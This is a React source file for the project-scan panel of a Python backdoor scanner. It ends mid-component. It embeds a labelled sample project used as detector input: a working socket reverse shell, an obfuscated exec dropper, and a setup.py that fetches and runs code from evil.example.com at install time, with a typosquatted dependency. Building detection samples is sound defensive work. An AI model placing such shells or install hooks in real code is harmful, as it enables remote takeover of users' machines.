"use client";

/**
 * ProjectScanPanel
 * ----------------
 * Sheet-based "Project Scan" panel for BackdoorSniper.
 *
 * Three tabs:
 *   A) Upload Archive   — drag-and-drop a .zip/.tar.gz of a Python project
 *   B) Multi-file Editor — paste multiple files with explicit paths
 *   C) Results          — aggregated ProjectScanResult with file tree,
 *                          hotspot ranking, top findings, and breakdown bars
 *
 * Consumes:
 *   POST /api/scan/upload    (multipart form `archive` field)
 *   POST /api/scan/project   (JSON { files: [{path, content}] })
 *
 * Style: emerald accent, shadcn/ui components, dark-mode friendly.
 */

import {
  useState,
  useCallback,
  useRef,
  useMemo,
  useEffect,
  type RefObject,
} from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Sheet,
  SheetContent,
  SheetHeader,
  SheetTitle,
} from "@/components/ui/sheet";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import {
  Collapsible,
  CollapsibleTrigger,
  CollapsibleContent,
} from "@/components/ui/collapsible";
import { ScrollArea } from "@/components/ui/scroll-area";
import { toast } from "sonner";
import {
  FolderTree,
  Upload,
  FileCode2,
  Files,
  Trash2,
  Plus,
  Loader2,
  ChevronDown,
  ChevronRight,
  ShieldCheck,
  ShieldAlert,
  ShieldX,
  ShieldQuestion,
  AlertTriangle,
  Activity,
  FileWarning,
  Flame,
  X,
  ListTree,
  Beaker,
  Code2,
  Layers,
} from "lucide-react";
import {
  SEVERITY_BADGE,
  CATEGORY_LABEL,
} from "@/lib/severity";
import type { Finding, Severity, Category } from "@/lib/detector/types";
import type {
  ProjectScanResult,
  ProjectFileResult,
} from "@/lib/detector/project-scanner";
import { ALL_RULES } from "@/lib/detector";

const RULE_COUNT = ALL_RULES.length;

interface ProjectScanPanelProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

interface FileEntry {
  path: string;
  content: string;
}

// ---------------------------------------------------------------------------
// Sample project (inline — 4 files: reverse shell, clean app, dropper, supply-chain)
// ---------------------------------------------------------------------------
const SAMPLE_PROJECT: FileEntry[] = [
  {
    path: "src/backdoor/shell.py",
    content: `"""Reverse shell backdoor — DO NOT EXECUTE."""
import socket
import subprocess
import os

HOST = "10.0.0.5"
PORT = 4444


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])


if __name__ == "__main__":
    connect()
`,
  },
  {
    path: "src/app.py",
    content: `"""Clean Flask app — no findings expected."""
from flask import Flask, jsonify, request

app = Flask(__name__)


@app.route("/health")
def health():
    return jsonify({"status": "ok"})


@app.route("/echo", methods=["POST"])
def echo():
    data = request.get_json(silent=True) or {}
    return jsonify(data)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
`,
  },
  {
    path: "src/utils/dropper.py",
    content: `"""Obfuscated dropper — exec + zlib + marshal + base64 chain."""
import base64
import zlib
import marshal

# Stage 1: a small encoded payload (inert placeholder)
_PAYLOAD = b"eNprYToDA3QyMjPSUVBJSi1LzVNU0lHQoSAGAvYwCg=="


def _exec_payload():
    raw = zlib.decompress(base64.b64decode(_PAYLOAD))
    code = marshal.loads(raw)
    exec(code)


if __name__ == "__main__":
    _exec_payload()
`,
  },
  {
    path: "setup.py",
    content: `"""Malicious supply-chain setup.py — install-time RCE + typosquat."""
import os
import subprocess
from setuptools import setup, find_packages

# Install-time code execution — fires on \`pip install\`
subprocess.Popen(
    ["python", "-c", "import urllib.request; "
     "exec(urllib.request.urlopen('http://evil.example.com/p').read())"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

setup(
    name="cool-package",
    version="1.0.4",
    packages=find_packages(),
    install_requires=[
        "reqeusts>=2.0",  # typosquatted 'requests'
        "numpy>=1.0",
    ],
    download_url="https://evil.example.com/cool-package.tar.gz",
    cmdclass={"install": type("MInstall", (), {"run": lambda self: None})()},
)
`,
  },
];

// ---------------------------------------------------------------------------
// Verdict helpers
// ---------------------------------------------------------------------------
function verdictIcon(v?: string, className = "h-4 w-4") {
  switch (v) {
    case "dangerous":
      return <ShieldX className={`${className} text-red-500`} />;
    case "malicious":
      return <ShieldAlert className={`${className} text-orange-500`} />;
    case "suspicious":
      return <ShieldQuestion className={`${className} text-amber-500`} />;
    case "clean":
      return <ShieldCheck className={`${className} text-emerald-500`} />;
    default:
      return <AlertTriangle className={`${className} text-muted-foreground`} />;
  }
}

function verdictColor(v?: string) {
  switch (v) {
    case "dangerous":
      return "text-red-500";
    case "malicious":
      return "text-orange-500";
    case "suspicious":
      return "text-amber-500";
    case "clean":
      return "text-emerald-500";
    default:
      return "text-muted-foreground";
  }
}

function riskText(score: number): string {
  if (score >= 70) return "text-red-600 dark:text-red-400";
  if (score >= 40) return "text-orange-600 dark:text-orange-400";
  if (score >= 15) return "text-amber-600 dark:text-amber-400";
  if (score > 0) return "text-emerald-600 dark:text-emerald-400";
  return "text-muted-foreground";
}

function riskBarColor(score: number): string {
  if (score >= 70) return "bg-red-500";
  if (score >= 40) return "bg-orange-500";
  if (score >= 15) return "bg-amber-500";
  if (score > 0) return "bg-emerald-500";
  return "bg-muted-foreground/30";
}

function formatBytes(n: number): string {
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / (1024 * 1024)).toFixed(1)} MB`;
}

function categoryLabel(cat: Category): string {
  return CATEGORY_LABEL[cat] ?? cat;
}

// ---------------------------------------------------------------------------
// File tree builder
// ---------------------------------------------------------------------------
interface TreeNode {
  name: string;
  path: string;
  isFile: boolean;
  children?: TreeNode[];
  fileResult?: ProjectFileResult;
}

function buildFileTree(files: ProjectFileResult[]): TreeNode {
  const root: TreeNode = { name: "", path: "", isFile: false, children: [] };
  for (const fr of files) {
    const parts = fr.path.split("/").filter(Boolean);
    if (parts.length === 0) continue;
    let current = root;
    for (let i = 0; i < parts.length; i++) {
      const part = parts[i];
      const isFile = i === parts.length - 1;
      const fullPath = parts.slice(0, i + 1).join("/");
      if (!current.children) current.children = [];
      let child = current.children.find(
        (c) => c.name === part && c.isFile === isFile,
      );
      if (!child) {
        child = {
          name: part,
          path: fullPath,
          isFile,
          children: isFile ? undefined : [],
          fileResult: isFile ? fr : undefined,
        };
        current.children.push(child);
      }
      current = child;
    }
  }
  // Sort: directories first, then files; alphabetical within each group.
  const sortRec = (node: TreeNode) => {
    if (!node.children) return;
    node.children.sort((a, b) => {
      if (a.isFile !== b.isFile) return a.isFile ? 1 : -1;
      return a.name < b.name ? -1 : a.name > b.name ? 1 : 0;
    });
    node.children.forEach(sortRec);
  };
  sortRec(root);
  return root;
}

// ---------------------------------------------------------------------------
// Main panel
// ---------------------------------------------------------------------------
export function ProjectScanPanel({
  open,
  onOpenChange,
}: ProjectScanPanelProps) {
  const [tab, setTab] = useState("upload");
  const [projectResult, setProjectResult] = useState<ProjectScanResult | null>(
    null,
  );
  const [loading, setLoading] = useState(false);
  const [highlightPath, setHighlightPath] = useState<string | null>(null);

  // --- Upload tab state ---
  const [archiveFile, setArchiveFile] = useState<File | null>(null);
  const [dragOver, setDragOver] = useState(false);
  const [uploadError, setUploadError] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // --- Multi-file editor state ---
  const [fileEntries, setFileEntries] = useState<FileEntry[]>([
    { path: "main.py", content: "" },
  ]);

  // Clear transient errors when the panel closes.
  useEffect(() => {
    if (!open) {
      setUploadError(null);
      setDragOver(false);
    }
  }, [open]);

  // ---- Upload handlers ----
  const MAX_ARCHIVE_BYTES = 50 * 1024 * 1024;
  const ACCEPTED_EXT = [".zip", ".tar.gz", ".tgz", ".tar"];

  function isAcceptedArchive(name: string): boolean {
    const lower = name.toLowerCase();
    return ACCEPTED_EXT.some((ext) => lower.endsWith(ext));
  }

  const handleArchiveSelected = useCallback((file: File | null) => {
    setUploadError(null);
    if (!file) return;
    if (!isAcceptedArchive(file.name)) {
      const msg = `Unsupported file type. Accepted: ${ACCEPTED_EXT.join(", ")}`;
      setUploadError(msg);
      toast.error("Unsupported file type", {
        description: "Use .zip, .tar.gz, .tgz, or .tar",
      });
      return;
    }
    if (file.size > MAX_ARCHIVE_BYTES) {
      const msg = `File too large: ${formatBytes(file.size)} (max ${formatBytes(
        MAX_ARCHIVE_BYTES,
      )})`;
      setUploadError(msg);
      toast.error("Archive too large", {
        description: `Max ${formatBytes(MAX_ARCHIVE_BYTES)}`,
      });
      return;
    }
    setArchiveFile(file);
  }, []);

  const onDrop = useCallback(
    (e: React.DragEvent) => {
      e.preventDefault();
      setDragOver(false);
      const f = e.dataTransfer.files?.[0];
      if (f) handleArchiveSelected(f);
    },
    [handleArchiveSelected],
  );

  const scanArchive = async () => {
    if (!archiveFile) return;
    setLoading(true);
    setUploadError(null);
    try {
      const fd = new FormData();
      fd.append("archive", archiveFile);
      const res = await fetch("/api/scan/upload", { method: "POST", body: fd });
      if (!res.ok) {
        const e = await res.json().catch(() => ({}));
        throw new Error(e.error || `Upload scan failed (${res.status})`);
      }
      const data: ProjectScanResult = await res.json();
      setProjectResult(data);
      setTab("results");
      const agg = data.aggregate;
      toast.success("Project scan complete", {
        description: `${agg.totalFiles} files · ${agg.totalFindings} findings · worst ${agg.worstVerdict}`,
      });
    } catch (e) {
      const msg = e instanceof Error ? e.message : "Unknown error";
      setUploadError(msg);
      toast.error("Project scan failed", { description: msg });
    } finally {
      setLoading(false);
    }
  };

  // ---- Multi-file editor handlers ----
  const addFile = () => {
    setFileEntries((prev) => [
      ...prev,
      { path: `file${prev.length + 1}.py`, content: "" },
    ]);
  };
  const removeFile = (idx: number) => {
    setFileEntries((prev) => prev.filter((_, i) => i !== idx));
  };
  const updateFile = (idx: number, patch: Partial<FileEntry>) => {
    setFileEntries((prev) =>
      prev.map((f, i) => (i === idx ? { ...f, ...patch } : f)),
    );
  };
  const loadSamples = () => {
    setFileEntries(SAMPLE_PROJECT.map((f) => ({ ...f })));
    toast.success("Loaded 4 sample Python files", {
      description:
        "1 reverse shell · 1 clean Flask app · 1 dropper · 1 malicious setup.py",
    });
  };

  const scanProjectFiles = async () => {
    const valid = fileEntries.filter(
      (f) => f.path.trim() && f.content.trim(),
    );
    if (valid.length === 0) {
      toast.error("No files to scan", {
        description: "Add at least one .py file with content",
      });
      return;
    }
    setLoading(true);
    try {
      const res = await fetch("/api/scan/project", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ files: valid, save: true }),
      });
      if (!res.ok) {
        const e = await res.json().catch(() => ({}));
        throw new Error(e.error || `Project scan failed (${res.status})`);
      }
      const data: ProjectScanResult = await res.json();
      setProjectResult(data);
      setTab("results");
      const agg = data.aggregate;
      toast.success("Project scan complete", {
        description: `${agg.totalFiles} files · ${agg.totalFindings} findings · worst ${agg.worstVerdict}`,
      });
    } catch (e) {
      const msg = e instanceof Error ? e.message : "Unknown error";
      toast.error("Project scan failed", { description: msg });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent className="w-full sm:max-w-5xl p-0 flex flex-col overflow-hidden">
        <SheetHeader className="px-5 py-4 border-b border-border bg-gradient-to-r from-emerald-500/5 to-transparent">
          <SheetTitle className="flex items-center gap-2 text-base">
            <FolderTree className="h-5 w-5 text-emerald-500" />
            Project Scan
            <Badge variant="outline" className="ml-1 text-[10px] font-mono">
              MULTI-FILE · ZIP · TAR
            </Badge>
            <span className="ml-auto text-[10px] font-mono text-muted-foreground">
              {RULE_COUNT} rules
            </span>
          </SheetTitle>
        </SheetHeader>

        <Tabs
          value={tab}
          onValueChange={setTab}
          className="flex-1 flex flex-col overflow-hidden"
        >
          <TabsList className="mx-4 mt-3 flex h-auto flex-wrap gap-1 bg-muted/50 p-1">
            <TabsTrigger
              value="upload"
              className="text-xs gap-1.5 flex-1 min-w-[120px]"
            >
              <Upload className="h-3.5 w-3.5" /> Upload Archive
            </TabsTrigger>
            <TabsTrigger
              value="editor"
              className="text-xs gap-1.5 flex-1 min-w-[120px]"
            >
              <Code2 className="h-3.5 w-3.5" /> Multi-file Editor
            </TabsTrigger>
            <TabsTrigger
              value="results"
              className="text-xs gap-1.5 flex-1 min-w-[120px]"
            >
              <ListTree className="h-3.5 w-3.5" /> Results
              {projectResult && (
                <span className="ml-1 rounded-full bg-emerald-500/20 px-1.5 py-0.5 text-[9px] font-bold text-emerald-600 dark:text-emerald-400">
                  {projectResult.aggregate.totalFiles}
                </span>
              )}
            </TabsTrigger>
          </TabsList>

          <TabsContent value="upload" className="flex-1 overflow-hidden mt-0">
            <UploadArchiveTab
              file={archiveFile}
              dragOver={dragOver}
              error={uploadError}
              loading={loading}
              onDrop={onDrop}
              onDragOver={(e) => {
                e.preventDefault();
                setDragOver(true);
              }}
              onDragLeave={() => setDragOver(false)}
              onSelectClick={() => fileInputRef.current?.click()}
              onFileSelected={handleArchiveSelected}
              onScan={scanArchive}
              onClear={() => setArchiveFile(null)}
              fileInputRef={fileInputRef}
            />
          </TabsContent>

          <TabsContent value="editor" className="flex-1 overflow-hidden mt-0">
            <MultiFileEditorTab
              entries={fileEntries}
              loading={loading}
              onAdd={addFile}
              onRemove={removeFile}
              onUpdate={updateFile}
              onLoadSamples={loadSamples}
              onScan={scanProjectFiles}
            />
          </TabsContent>

          <TabsContent value="results" className="flex-1 overflow-hidden mt-0">
            <ResultsTab
              result={projectResult}
              loading={loading}
              highlightPath={highlightPath}
              onHighlight={setHighlightPath}
            />
          </TabsContent>
        </Tabs>
      </SheetContent>
    </Sheet>
  );
}

// ===========================================================================
// Tab A — Upload Archive
// ===========================================================================
interface UploadArchiveTabProps {
  file: File | null;
  dragOver: boolean;
  error: string | null;
  loading: boolean;
  onDrop: (e: React.DragEvent) => void;
  onDragOver: (e: React.DragEvent) => void;
  onDragLeave: () => void;
  onSelectClick: () => void;
  onFileSelected: (file: File | null) => void;
  onScan: () => void;
  onClear: () => void;
  fileInputRef: RefObject<HTMLInputElement | null>;
}

function UploadArchiveTab({
  file,
  dragOver,
  error,
  loading,
  onDrop,
  onDragOver,
  onDragLeave,
  onSelectClick,
  onFileSelected,
  onScan,
  onClear,
  fileInputRef,
}: UploadArchiveTabProps) {
  return (
    <div className="flex h-full flex-col overflow-hidden">
      <ScrollArea className="thin-scrollbar flex-1">
        <div className="space-y-4 p-4">
          <div className="text-xs leading-relaxed text-muted-foreground">
            Drop a Python project archive (
            <code className="rounded bg-muted px-1 py-0.5 font-mono text-[10px]">
              .zip
            </code>
            {" / "}
            <code className="rounded bg-muted px-1 py-0.5 font-mono text-[10px]">
              .tar.gz
            </code>
            ) — we&apos;ll extract every{" "}
            <code className="rounded bg-muted px-1 py-0.5 font-mono text-[10px]">
              .py
            </code>{" "}
            file (skipping{" "}
            <code className="font-mono text-[10px]">__pycache__/</code>,{" "}
            <code className="font-mono text-[10px]">.git/</code>,{" "}
            <code className="font-mono text-[10px]">venv/</code>,{" "}
            <code className="font-mono text-[10px]">site-packages/</code>) and
            scan them in parallel.
          </div>

          {/* Drop zone */}
          <div
            onDrop={onDrop}
            onDragOver={onDragOver}
            onDragLeave={onDragLeave}
            onClick={onSelectClick}
            role="button"
            tabIndex={0}
            onKeyDown={(e) => {
              if (e.key === "Enter" || e.key === " ") {
                e.preventDefault();
                onSelectClick();
              }
            }}
            className={`relative flex min-h-[220px] cursor-pointer flex-col items-center justify-center rounded-xl border-2 border-dashed p-6 text-center transition-all ${
              dragOver
                ? "border-emerald-500 bg-emerald-500/5 scale-[1.01]"
                : "border-border bg-muted/30 hover:bg-muted/50 hover:border-emerald-500/40"
            } ${loading ? "pointer-events-none opacity-60" : ""}`}
            aria-label="Drop archive or click to browse"
          >
            <motion.div
              initial={false}
              animate={{ scale: dragOver ? 1.1 : 1 }}
              className="mb-3 flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10"
            >
              <Upload className="h-7 w-7 text-emerald-500" />
            </motion.div>
            <p className="text-sm font-semibold">
              Drop archive here or click to browse
            </p>
            <p className="mt-1 text-[11px] text-muted-foreground">
              Accepts .zip, .tar.gz, .tgz, .tar
            </p>
            <p className="mt-2 text-[10px] font-mono text-muted-foreground">
              Max 50MB total · 5MB per file · 500 files
            </p>
            <input
              ref={fileInputRef}
              type="file"
              accept=".zip,.tar.gz,.tgz,.tar,application/zip,application/gzip,application/x-tar"
              className="hidden"
              onChange={(e) => {
                if (e.target.files?.[0]) onFileSelected(e.target.files[0]);
                e.target.value = "";
              }}
            />
          </div>

          {/* Selected file preview */}
          <AnimatePresence>
            {file && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0, height: 0 }}
                className="overflow-hidden"
              >
                <div className="rounded-md border border-border bg-card p-3">
                  <div className="flex items-center gap-2">
                    <FileCode2 className="h-4 w-4 shrink-0 text-emerald-500" />
                    <span className="min-w-0 flex-1 truncate font-mono text-sm">
                      {file.name}
                    </span>
                    <Badge variant="outline" className="text-[10px]">
                      {formatBytes(file.size)}
                    </Badge>
                    <Button
                      variant="ghost"
                      size="sm"
                      className="h-7 w-7 shrink-0 p-0"
                      onClick={(e) => {
                        e.stopPropagation();
                        onClear();
                      }}
                      aria-label="Remove file"
                    >
                      <X className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Error message */}
          <AnimatePresence>
            {error && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0, height: 0 }}
                className="overflow-hidden"
              >
                <div className="flex items-start gap-2 rounded-md border border-red-500/40 bg-red-500/10 p-3 text-xs text-red-600 dark:text-red-400">
                  <AlertTriangle className="mt-0.5 h-4 w-4 shrink-0" />
                  <span>{error}</span>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Loading overlay */}
          <AnimatePresence>
            {loading && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0, height: 0 }}
                className="overflow-hidden"
              >
                <div className="flex flex-col items-center rounded-md border border-emerald-500/40 bg-emerald-500/5 p-5 text-center">
                  <Loader2 className="mb-2 h-7 w-7 animate-spin text-emerald-500" />
                  <p className="text-sm font-medium">Scanning archive…</p>
                  <p className="mt-0.5 text-[11px] text-muted-foreground">
                    Running {RULE_COUNT} detection rules across all extracted
                    Python files
                  </p>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </ScrollArea>

      {/* Sticky footer */}
      <div className="flex items-center justify-between gap-2 border-t border-border bg-muted/30 px-4 py-3">
        <span className="text-[11px] text-muted-foreground">
          {file
            ? `Ready to scan: ${file.name}`
            : "No archive selected"}
        </span>
        <Button
          onClick={onScan}
          disabled={!file || loading}
          className="bg-emerald-600 text-xs hover:bg-emerald-700 disabled:opacity-50"
        >
          {loading ? (
            <Loader2 className="mr-1.5 h-4 w-4 animate-spin" />
          ) : (
            <ShieldCheck className="mr-1.5 h-4 w-4" />
          )}
          {loading ? "Scanning…" : "Scan archive"}
        </Button>
      </div>
    </div>
  );
}

// ===========================================================================
// Tab B — Multi-file Editor
// ===========================================================================
interface MultiFileEditorTabProps {
  entries: FileEntry[];
  loading: boolean;
  onAdd: () => void;
  onRemove: (idx: number) => void;
  onUpdate: (idx: number, patch: Partial<FileEntry>) => void;
  onLoadSamples: () => void;
  onScan: () => void;
}

function MultiFileEditorTab({
  entries,
  loading,
  onAdd,
  onRemove,
  onUpdate,
  onLoadSamples,
  onScan,
}: MultiFileEditorTabProps) {
  const totalLines = entries.reduce(
    (sum, f) => sum + f.content.split("\n").length,
    0,
  );
  const nonEmpty = entries.filter((f) => f.content.trim()).length;

  return (
    <div className="flex h-full flex-col overflow-hidden">
      {/* Toolbar */}
      <div className="flex flex-wrap items-center gap-2 border-b border-border bg-muted/30 px-4 py-2">
        <div className="text-[11px] text-muted-foreground">
          {entries.length} file{entries.length !== 1 ? "s" : ""} ·{" "}
          {nonEmpty} with content · {totalLines.toLocaleString()} lines
        </div>
        <div className="ml-auto flex flex-wrap gap-2">
          <Button
            variant="outline"
            size="sm"
            className="h-8 gap-1.5 text-xs"
            onClick={onLoadSamples}
            disabled={loading}
          >
            <Beaker className="h-3.5 w-3.5 text-emerald-500" />
            Load sample project
          </Button>
          <Button
            variant="outline"
            size="sm"
            className="h-8 gap-1.5 text-xs"
            onClick={onAdd}
            disabled={loading}
          >
            <Plus className="h-3.5 w-3.5" />
            Add file
          </Button>
          <Button
            size="sm"
            className="h-8 gap-1.5 bg-emerald-600 text-xs hover:bg-emerald-700"
            onClick={onScan}
            disabled={loading || nonEmpty === 0}
          >
            {loading ? (
              <Loader2 className="h-3.5 w-3.5 animate-spin" />
            ) : (
              <ShieldCheck className="h-3.5 w-3.5" />
            )}
            {loading ? "Scanning…" : "Scan project"}
          </Button>
        </div>
      </div>

      {/* File list */}
      <ScrollArea className="thin-scrollbar flex-1">
        <div className="space-y-3 p-4">
          {entries.map((entry, idx) => (
            <FileEditorRow
              key={idx}
              entry={entry}
              idx={idx}
              loading={loading}
              onUpdate={onUpdate}
              onRemove={onRemove}
            />
          ))}
          {entries.length === 0 && (
            <div className="rounded-md border border-dashed border-border p-6 text-center text-xs text-muted-foreground">
              <Files className="mx-auto mb-2 h-6 w-6 opacity-50" />
              No files yet. Click &quot;Add file&quot; or &quot;Load sample
              project&quot; to get started.
            </div>
          )}
        </div>
      </ScrollArea>
    </div>
  );
}

function FileEditorRow({
  entry,
  idx,
  loading,
  onUpdate,
  onRemove,
}: {
  entry: FileEntry;
  idx: number;
  loading: boolean;
  onUpdate: (idx: number, patch: Partial<FileEntry>) => void;
  onRemove: (idx: number) => void;
}) {
  const lineCount = entry.content.split("\n").length;
  return (
    <motion.div
      initial={{ opacity: 0, y: 4 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: Math.min(idx * 0.02, 0.2) }}
      className="overflow-hidden rounded-md border border-border bg-card"
    >
      <div className="flex items-center gap-2 border-b border-border bg-muted/20 px-3 py-1.5">
        <FileCode2 className="h-3.5 w-3.5 shrink-0 text-emerald-500" />
        <Input
          value={entry.path}
          onChange={(e) => onUpdate(idx, { path: e.target.value })}
          placeholder="src/utils/net.py"
          disabled={loading}
          className="h-7 flex-1 border-none bg-transparent px-1 font-mono text-xs shadow-none focus-visible:ring-0"
        />
        <span className="font-mono text-[10px] text-muted-foreground">
          {lineCount} L
        </span>
        <Button
          variant="ghost"
          size="sm"
          className="h-7 w-7 shrink-0 p-0 text-muted-foreground hover:text-destructive"
          onClick={() => onRemove(idx)}
          disabled={loading}
          aria-label="Remove file"
        >
          <Trash2 className="h-3.5 w-3.5" />
        </Button>
      </div>
      <Textarea
        value={entry.content}
        onChange={(e) => onUpdate(idx, { content: e.target.value })}
        placeholder={`# Paste Python source for ${entry.path} here…`}
        disabled={loading}
        spellCheck={false}
        className="min-h-[120px] resize-y rounded-none border-none bg-background font-mono text-xs shadow-none focus-visible:ring-0"
      />
    </motion.div>
  );
}

// ===========================================================================
// Tab C — Results (the heavy tab)
// ===========================================================================
interface ResultsTabProps {
  result: ProjectScanResult | null;
  loading: boolean;
  highlightPath: string | null;
  onHighlight: (path: string | null) => void;
}

function ResultsTab({
  result,
  loading,
  highlightPath,
  onHighlight,
}: ResultsTabProps) {
  if (loading && !result) {
    return (
      <div className="flex h-full flex-col items-center justify-center gap-3 p-8 text-center">
        <Loader2 className="h-8 w-8 animate-spin text-emerald-500" />
        <div>
          <p className="text-sm font-medium">Running project scan…</p>
          <p className="text-[11px] text-muted-foreground">
            Aggregating results across all files
          </p>
        </div>
      </div>
    );
  }

  if (!result) {
    return (
      <div className="flex h-full flex-col items-center justify-center gap-3 p-12 text-center">
        <div className="flex h-16 w-16 items-center justify-center rounded-full bg-muted/40">
          <ListTree className="h-8 w-8 text-muted-foreground/60" />
        </div>
        <div>
          <p className="text-sm font-medium">No project scan yet</p>
          <p className="mt-1 text-[11px] text-muted-foreground">
            Upload an archive or paste multiple files to see aggregated results
            here.
          </p>
        </div>
      </div>
    );
  }

  const agg = result.aggregate;

  return (
    <ScrollArea className="thin-scrollbar h-full">
      <div className="space-y-4 p-4">
        {/* Top row — KPI cards */}
        <KpiRow result={result} />

        {/* Second row — file tree + hotspot/top findings */}
        <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
          {/* Left: file tree */}
          <div className="rounded-md border border-border bg-card">
            <div className="flex items-center justify-between border-b border-border px-3 py-2">
              <h4 className="flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                <ListTree className="h-3.5 w-3.5 text-emerald-500" />
                File Tree ({result.files.length})
              </h4>
              <Badge variant="outline" className="text-[10px]">
                {agg.totalLines.toLocaleString()} lines
              </Badge>
            </div>
            <FileTreeView
              result={result}
              highlightPath={highlightPath}
              onHighlight={onHighlight}
            />
          </div>

          {/* Right: hotspot ranking + top findings */}
          <div className="flex flex-col gap-4">
            <div className="rounded-md border border-border bg-card">
              <div className="flex items-center justify-between border-b border-border px-3 py-2">
                <h4 className="flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                  <Flame className="h-3.5 w-3.5 text-orange-500" />
                  Hotspot Ranking (top {Math.min(20, agg.hotspotFiles.length)})
                </h4>
              </div>
              <HotspotRankingView
                result={result}
                onClick={(path) => onHighlight(path)}
              />
            </div>

            <div className="rounded-md border border-border bg-card">
              <div className="flex items-center justify-between border-b border-border px-3 py-2">
                <h4 className="flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                  <FileWarning className="h-3.5 w-3.5 text-amber-500" />
                  Top Findings ({agg.topFindings.length})
                </h4>
              </div>
              <TopFindingsView result={result} />
            </div>
          </div>
        </div>

        {/* Bottom row — breakdown bars */}
        <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
          <BreakdownCard
            title="Severity Breakdown"
            icon={<AlertTriangle className="h-3.5 w-3.5 text-amber-500" />}
            subtitle={`${agg.totalFindings} total findings`}
          >
            <SeverityBars result={result} />
          </BreakdownCard>
          <BreakdownCard
            title="Category Breakdown"
            icon={<Layers className="h-3.5 w-3.5 text-emerald-500" />}
            subtitle={`${Object.values(agg.byCategory).filter((n) => (n ?? 0) > 0).length} categories triggered`}
          >
            <CategoryBars result={result} />
          </BreakdownCard>
        </div>

        {/* Footer meta */}
        <div className="flex items-center justify-between rounded-md border border-border bg-muted/20 px-3 py-2 font-mono text-[10px] text-muted-foreground">
          <span>
            Scan duration: {(result.durationMs / 1000).toFixed(2)}s
          </span>
          <span>
            {agg.totalFiles} files scanned · worst verdict{" "}
            <span className={`font-bold ${verdictColor(agg.worstVerdict)}`}>
              {agg.worstVerdict}
            </span>
          </span>
        </div>
      </div>
    </ScrollArea>
  );
}

// ----- KPI row -----
function KpiRow({ result }: { result: ProjectScanResult }) {
  const agg = result.aggregate;
  const maxRisk = agg.maxRiskScore;

  const kpis: Array<{
    label: string;
    value: string | number;
    icon: React.ReactNode;
    accent: string;
    sub?: string;
  }> = [
    {
      label: "Files scanned",
      value: agg.totalFiles,
      icon: <Files className="h-3.5 w-3.5" />,
      accent: "text-emerald-600 dark:text-emerald-400 border-emerald-500/30 bg-emerald-500/5",
    },
    {
      label: "Lines scanned",
      value: agg.totalLines.toLocaleString(),
      icon: <Code2 className="h-3.5 w-3.5" />,
      accent: "text-emerald-600 dark:text-emerald-400 border-emerald-500/30 bg-emerald-500/5",
    },
    {
      label: "Total findings",
      value: agg.totalFindings,
      icon: <AlertTriangle className="h-3.5 w-3.5" />,
      accent:
        agg.totalFindings > 0
          ? "text-amber-600 dark:text-amber-400 border-amber-500/30 bg-amber-500/5"
          : "text-emerald-600 dark:text-emerald-400 border-emerald-500/30 bg-emerald-500/5",
    },
    {
      label: "Worst verdict",
      value: agg.worstVerdict,
      icon: verdictIcon(agg.worstVerdict, "h-3.5 w-3.5"),
      accent: `${verdictColor(agg.worstVerdict)} border-current/30`,
      sub: "across project",
    },
    {
      label: "Max risk score",
      value: maxRisk,
      icon: <Activity className="h-3.5 w-3.5" />,
      accent: `${riskText(maxRisk)} border-current/30`,
      sub: "/ 100",
    },
  ];

  return (
    <div className="grid grid-cols-2 gap-2 sm:grid-cols-3 lg:grid-cols-5">
      {kpis.map((kpi) => (
        <motion.div
          key={kpi.label}
          initial={{ opacity: 0, y: 6 }}
          animate={{ opacity: 1, y: 0 }}
          className={`rounded-md border p-3 ${kpi.accent}`}
        >
          <div className="flex items-center gap-1 text-[10px] uppercase tracking-wide opacity-80">
            {kpi.icon}
            <span className="truncate">{kpi.label}</span>
          </div>
          <div className="mt-1 flex items-baseline gap-1">
            <span className="text-xl font-bold tabular-nums capitalize">
              {kpi.value}
            </span>
            {kpi.sub && (
              <span className="text-[10px] text-muted-foreground">{kpi.sub}</span>
            )}
          </div>
        </motion.div>
      ))}
    </div>
  );
}

// ----- File tree view -----
function FileTreeView({
  result,
  highlightPath,
  onHighlight,
}: {
  result: ProjectScanResult;
  highlightPath: string | null;
  onHighlight: (path: string | null) => void;
}) {
  const tree = useMemo(() => buildFileTree(result.files), [result]);
  const hotspotPaths = useMemo(
    () =>
      new Set(result.aggregate.hotspotFiles.slice(0, 5).map((h) => h.path)),
    [result],
  );

  if (result.files.length === 0) {
    return (
      <div className="p-4 text-center text-[11px] text-muted-foreground">
        No files in scan result.
      </div>
    );
  }

  return (
